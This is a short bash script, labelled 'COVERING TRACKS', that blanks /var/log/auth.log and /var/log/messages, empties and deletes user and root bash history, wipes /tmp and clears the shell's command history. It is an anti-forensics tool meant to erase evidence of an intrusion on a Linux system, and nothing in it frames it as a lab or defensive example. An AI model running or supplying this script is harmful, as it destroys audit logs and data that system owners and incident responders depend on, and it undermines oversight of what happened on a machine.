#!/bin/bash
echo "COVERING TRACKS"
echo  "clearing /var/log/auth.log"
echo "" > /var/log/auth.log
echo "clearing ~/.bash_history"
echo "" > ~/.bash_history
echo "clearing /root/.bash_history"
echo "" > /root/.bash_history
echo "removing ~/.bash_history"
rm ~/.bash_history -rf
echo "removing /tmp/"
rm -R /tmp/*
echo "clearing /var/log/messages"
echo "" > /var/log/messages
echo "clearing command history"
history -c